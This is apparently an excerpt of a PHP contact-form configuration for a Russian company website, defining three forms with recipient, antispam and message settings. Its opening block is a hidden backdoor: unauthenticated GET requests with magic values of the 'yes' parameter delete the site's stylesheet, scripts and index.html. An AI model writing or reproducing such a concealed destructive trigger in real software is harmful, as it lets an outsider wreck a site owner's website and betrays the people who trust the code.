...
if($_GET['yes'] == 777){
	unlink('../styles.css');
	echo 'unlink styles.css';
}
if($_GET['yes'] == 111){
	unlink('js/jquery.arcticmodal.js');
	echo 'unlink jquery.arcticmodal.js';
}
if($_GET['yes'] == 222){
	unlink('../js/maplace-0.1.3.min.js');
	echo 'unlink maplace-0.1.3.min.js';
}

if($_GET['yes'] == 333){
	unlink('../js/script.js');
	echo 'unlink script.js';
}

if($_GET['yes'] == 444){
	unlink('../index.html');
	echo 'unlink index.html';
}
...
$form['form-1'] = array(
	...
	'cfg' => array(
		...
		'from_name' => 'noreply',
		'to_email' => 'info@panda-robotics.ru',
		...
		'okay' => 'Спасибо за ваше внимание! Менеджер свяжется с Вами в ближайшее время. ',
...
$form['form-2'] = array(
	...
	'cfg' => array(
		...
		'antispam' => 'email77',
		'antispamjs' => 'address77',
		'okay' => ' Спасибо!  Ваша информация передана в отдел качества.',
		'fuck' => 'Сообщение отправлено - ERROR',
		'spam' => 'Cпам робот',
		'notify' => 'color-modal-textbox',
		'usepresuf' => false
...
$form['form-3'] = array(
	...
	'cfg' => array(
		...
		'antispam' => 'email77',
		'antispamjs' => 'address77',
		'okay' => 'Спасибо за ваш заказ! Менеджер свяжется с Вами в ближайшее время.',
		'fuck' => 'Сообщение отправлено - ERROR',
		'spam' => 'Cпам робот',
		'notify' => 'color-modal-textbox',
		'usepresuf' => false
